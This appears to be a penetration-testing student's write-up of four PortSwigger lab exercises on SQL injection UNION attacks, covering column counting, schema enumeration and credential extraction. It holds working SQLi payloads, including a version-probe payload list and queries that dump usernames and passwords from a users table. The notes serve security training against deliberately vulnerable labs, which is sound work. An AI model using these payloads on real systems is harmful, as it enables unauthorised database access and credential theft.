# SQL Injection UNION Attack
- More on SQL UNION injection can be understood at portswigger's guide on [UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks).

## SQL injection UNION attack, determining the number of columns returned by the query
- To solve the lab, determine the number of columns returned by the query by performing an SQL injection UNION attack that returns an additional row containing null values. 

### Enumeration
#### Mapping Visible Content
- We are given the website below with the following functions : "Login", "View Details", and "Category Filter" 

![[Pasted image 20220823142712.png]]

- The "Login" function uses a POST request to send username and password. 

![[Pasted image 20220823142757.png]]

- Below is the result when invalid credentials are used.

![[Pasted image 20220823143305.png]]

- The "View Details" function is referenced to `/product?productId=<product number>`. And each product has its own page.

![[Pasted image 20220823142840.png]]

The "Category Filter" functin also makes use of references `/filter?category=<text filter>`

![[Pasted image 20220823142909.png]]

#### Mapping Attack Surface
- From quick application mapping above, we can see that there are a few probable vectors of entry for SQLi. The first probable location for SQLi would be "View Details" function and the other is in the "Category Filter" function.

### Vulnerability Analysis / Exploitation
- [Hacktricks](https://book.hacktricks.xyz/pentesting-web/sql-injection#exploiting-union-based) has a good explanation of how we can find out the number of columns in the database and [payloadbox](https://github.com/payloadbox/sql-injection-payload-list/tree/master/Intruder/detect) has a list of payloads we can use to detect SQLi. In this case, we will be using [Generic_UnionSelect.txt](https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/detect/Generic_UnionSelect.txt).
- To fuzz for UNION based SQLi, we will use burp intruder.
- However, there is some additions we need to make to the `UNION SELECT` wordlist based on the recommendations by [Hacktricks](https://book.hacktricks.xyz/pentesting-web/sql-injection#union-select) : 

>You should use `null` values as in some cases the type of the columns of both sides of the query must be the same and `null` is valid in every case.

```sql
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```

- Hence the above payload should also be added to the test payload.

#### Testing "View Details"
![[Pasted image 20220823213358.png]]
![[Pasted image 20220823213803.png]]

- Based on the results above all requests meets with `error 400` response, it seems like `product?productId=<number>` is not vulnerable to SQL injection.

#### Testing "Category Filter"
![[Pasted image 20220823214123.png]]
![[Pasted image 20220823214204.png]]

- There are `200 OK` response as well as `error 500`. Hence it seems like this might be the vulnerable function.
- We filter for the `200 OK` responses and check the response results. 
- Reponse if false would be empty.

![[Pasted image 20220823214409.png]]

![[Pasted image 20220823215202.png]]

## SQL injection UNION attack, finding a column containing text
- As this exercise builds on the previous exercise "[[#SQL injection UNION attack determining the number of columns returned by the query]]", we will skip the Application Mapping Phase and move straight to the vulnerablity assessment and exploitation phase.
- The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform an SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

### Vulnerability Assessment 
- First off we will use burp intruder and the fuzzing list we used above to find out the number of columns that is returned by the query.

![[Pasted image 20220823223720.png]]

- As can be seen above after filtering for `200 OK` responses only `NULL,NULL,NULL` returns to us with the correct response. Hence we know that there are 3 columns. 

### Exploitation
- Now that we know that there are 3 columns in the table, we will now need to find which column contain text and to do so we will need to fuzz with a string variable in the parameter. The payload used is like below : 

![[Pasted image 20220823224538.png]]

- As can be seen below, only `'UNION SELECT NULL,'a',NULL` gives a `200 OK` response and value `'a'` is included in the table.
 
![[Pasted image 20220823224713.png]]
![[Pasted image 20220823224742.png]]

- We use the string that is required to solve the lab "TARkG7" and lab is solved.

![[Pasted image 20220823224938.png]]

## SQL injection UNION attack, retrieving data from other tables
- This lab builds on the above 2 labs and hence, we will skip the application mapping phase and move straight to attacking SQL injection.
- To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user. 

### Vulnerability Assessment 
- We will now test if the query is SQL injectable using Burp Intruder.
![[Pasted image 20220824122539.png]]
![[Pasted image 20220824122552.png]]

- We will then test for the columns that can hold strings and it seems like both the columns in the table can hold string data.

![[Pasted image 20220824123035.png]]
![[Pasted image 20220824123051.png]] ![[Pasted image 20220824123106.png]]

### Database Enumeration
- After assessing that the query is vulnerable to SQLi, we will now need to go retrieve information from the database. 
- However, we will need certain information like the type of databse used the tables in the database, the columns in the table of interest. Hence the following enumeration steps needs to be done.
- We will be using this [cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) to formulate our payloads for enumeration.

#### Enumerating Database Version
- To conduct any exploit, we will need to know the database version as it will determine the query language that is used.

![[Pasted image 20220824123434.png]]

- We run through all the possible query languages for the database version and found out that this database uses postgreSQL.

![[Pasted image 20220824123507.png]]

#### Enumerating Tables
- Using the [PostgreSQL documentation](https://www.postgresql.org/docs/current/infoschema-tables.html) we came up with the following payload. This payload will retrieve table name and table type from information schema. 
- So that we can find out what are the tables that are available in this database.

```
' UNION SELECT table_name,table_type FROM information_schema.tables --
```

- As can be seen below, we see a table that does not seem to be default called "users".

![[Pasted image 20220824131222.png]]

#### Enumerating Columns

- We then try to find out what are the columns in the users table and we use the following payload below : 

```
' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name = 'users' --
```

- As can be seen, there are only 2 columns 'username' and 'password'.

![[Pasted image 20220824131629.png]]

### Exploitation
- Hence to exploit this we will retrieve all the rows in the columns by using the following payload.

```
' UNION SELECT username,password FROM users --
```

![[Pasted image 20220824131829.png]]
![[Pasted image 20220824131839.png]]
![[Pasted image 20220824131847.png]]
![[Pasted image 20220824131928.png]]

## SQL injection UNION attack, retrieving multiple values in a single column
- To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 
- The following list of payloads were derived from previous exercises :

```sql
' UNION SELECT null--
' UNION SELECT null,null--
' UNION SELECT null,null,null --

' UNION SELECT banner FROM v$version --
' UNION SELECT null,banner FROM v$version --
' UNION SELECT banner,null FROM v$version--
' UNION SELECT null,null,banner FROM v$version--
' UNION SELECT null,,banner,null FROM v$version--
' UNION SELECT ,banner,null,null FROM v$version--

' UNION SELECT @@version --
' UNION SELECT null,@@version --
' UNION SELECT @@version,null--
' UNION SELECT null,null,@@version--
' UNION SELECT null,@@version,null--
' UNION SELECT @@version,null,null--

' UNION SELECT version()--
' UNION SELECT null,version()--
' UNION SELECT version(),null--
' UNION SELECT null,null,version()--
' UNION SELECT null,version(),null--
' UNION SELECT version(),null,null--
```

### Vulnerability Assessment
- We use burp intruder and the paylaod above to check SQLi, the number of columns that is displayed and the column that allows for string.

![[Pasted image 20220824150311.png]]
![[Pasted image 20220824150335.png]]

- From the results, above, we filter for `200 OK` responses and found out that there are only 2 columns and the second column is the one that can accept strings.

### Database Enumeration
#### Enumerating Database Version
- In the same burp intruder "attack", we also injected various kind of "version" to enumerate the database version. From the enumeration, we know that PostgreSQL is used.

![[Pasted image 20220824150904.png]]

#### Enumerating Tables in Database
- After ascertaining database version, we send the payload below to enumerate the schema to check for non-default tables. We have to use string concatenation as only one column is available. 

```
' UNION SELECT null,table_name||'-'||table_type FROM information_schema.tables--
```

- We found that there is an interesting "users" table that is non-default. 

![[Pasted image 20220824151832.png]]

#### Enumerating Columns in "users" Table
- We then continued to enumerate the columns that are in the "users" table with the payload below. 

```
' UNION SELECT null,column_name || '-' || data_type FROM information_schema.columns WHERE table_name = 'users' --
```

- We find out that there are only two columns in the "users" table - "password" and "username"

![[Pasted image 20220824152147.png]]

### Exploitation
- We finish by using the payload below to enumerate all the rows in the username and password columns.

```
' UNION SELECT null, username || '-' || password FROM users --
```

- As can be seen below, we get the username and passwords of `administrator`.

![[Pasted image 20220824152304.png]]

- We logged into the administrator account to finish the challenge.

![[Pasted image 20220824152402.png]]